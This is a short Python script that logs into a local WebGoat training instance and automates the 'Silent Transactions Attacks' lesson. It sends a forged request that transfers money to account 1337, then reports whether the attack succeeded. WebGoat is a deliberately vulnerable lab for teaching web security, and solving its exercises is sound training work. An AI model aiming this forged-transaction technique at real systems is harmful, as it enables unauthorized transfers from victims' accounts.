import requests
import json

s = requests.Session()

#Request login page
r = s.get('http://127.0.0.1:8080/WebGoat/login.mvc')
session1 = r.headers['Set-Cookie']
#print session1

#Log into WebGoat
r = s.post('http://127.0.0.1:8080/WebGoat/j_spring_security_check;jsessionid=' + session1, data={"username":"guest","password":"guest"})
session2 =  r.request.headers['Cookie']
#print session2

#Figure out which menu item is "Silent Transactions Attacks"
r = s.get('http://127.0.0.1:8080/WebGoat/attack?Screen=146&menu=400')
r = s.get('http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc')

my_dict = r.json()
my_link =  my_dict[3]['children'][6]['link']
#print my_link

#Submit the attack to the AJAX Security => Silent Transactions Attack page
attack_url = 'http://127.0.0.1:8080/WebGoat/' + my_link + '&from=ajax&newAccount=1337&amount=12345&confirm=Confirm'
#print attack_url
r = s.get(attack_url)
#print r.text

if "silently" in r.text:
	print "Attack Successful"
else:
	print "Attack Failed"


